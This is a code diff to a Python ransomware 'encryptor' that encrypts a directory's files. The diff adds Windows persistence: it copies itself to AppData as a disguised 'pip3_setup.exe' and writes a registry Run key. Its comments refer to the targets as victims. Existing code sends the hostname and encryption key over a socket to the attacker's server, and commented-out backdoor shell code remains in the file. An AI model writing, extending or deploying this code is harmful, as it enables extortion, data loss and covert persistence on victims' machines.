@@ -3,6 +3,9 @@ import os
 import threading
 import queue
 import random
+import shutil
+import sys
+import subprocess
 
 # 1st program = encryptor
 # To encrypt all the file at a given directory and transmit
@@ -148,16 +151,46 @@ for i in range(ENCRYPTION_LEVEL):
     key += key_char_pool[random.randint(0, key_char_pool_len-1)]
 print('Key has been generated!') 
 
+# ============= Gaining persistency
+# A common C:\Users\USER\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Programs\pip3_setup.exe ;)
+location = os.environ["appdata"] + "\\Microsoft\\Windows\\Start Menu\\Programs\\pip3_setup.exe"
 
-# Connect to server to transfer key and hostname
-with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-    s.connect((IP_ADDRESS, PORT))
-    print('Successfully connected...')
-    print('Transmitting hostname and Key')
-    s.send(f'{hostname} : {key}'.encode('utf-8'))
-    print('Done transmitting data!')
-    # Close socket when done
-    s.close()
+# If 'location' does NOT exist, it's 1st time running this Backdoor client
+
+if not os.path.exists(location):
+#     # Performing copying action of our Backdoor.exe to User's /AppData
+      shutil.copyfile(sys.executable, location)
+#     # Allow users to proactively connect to our backdoor server
+#     # whenever they login to their machines
+#     #
+#     # Appending machine startup .exe permissions to Victims' Windows regkey at
+#     # HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
+#     # /v = Name; /t = Type; /d = Data
+      subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v pip3 /t REG_SZ /d "' + location + '"', shell=True)
+else:
+    # Otherwise, just jump to steps below
+    #sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+    # ==========================================
+    # port = 54321
+    #sock.connect((IP_ADDRESS, port))
+    #print(f'Connection Established to Server!')
+    #shell()
+    # ==========================================
+    #connection()
+    #answer = "Server: Hello Back!"
+    #sock.send(answer.encode())
+    #sock.close()
+    
+    # Connect to server to transfer key and hostname
+    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+        s.connect((IP_ADDRESS, PORT))
+        print('Successfully connected...')
+        print('Transmitting hostname and Key')
+        s.send(f'{hostname} : {key}'.encode('utf-8'))
+        print('Done transmitting data!')
+        # Close socket when done
+        s.close()
+# ============= Gaining persistency
 
 # Store files into a queue for threads to handle
 # Enabling multi-threading to speed up the encryption/decryption process
